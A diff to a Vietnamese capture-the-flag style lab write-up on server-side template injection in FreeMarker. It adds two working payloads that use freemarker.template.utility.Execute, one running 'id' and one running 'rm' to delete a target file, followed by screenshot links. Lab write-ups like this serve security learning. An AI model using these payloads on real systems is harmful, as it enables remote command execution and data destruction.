@@ -94,3 +94,18 @@ Thấy thông tin loại template sử dụng => `freemarker`
 
 <img width="600" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/466f1726-a520-4123-a559-89b09c21cb6c">
 
+Áp dụng payload:
+
+`<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }`
+
+Kết qủa response trả về:
+
+<img width="594" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/59bbe83d-afc2-4199-9af3-247677c7b774">
+
+=> Thực hiện xóa file theo yêu cầu:
+
+`<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("rm /home/carlos/morale.txt") }`
+
+LAB SOLVED!
+
+<img width="595" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/4cf25a48-9f68-4d2d-be16-e83c8b0b993c">
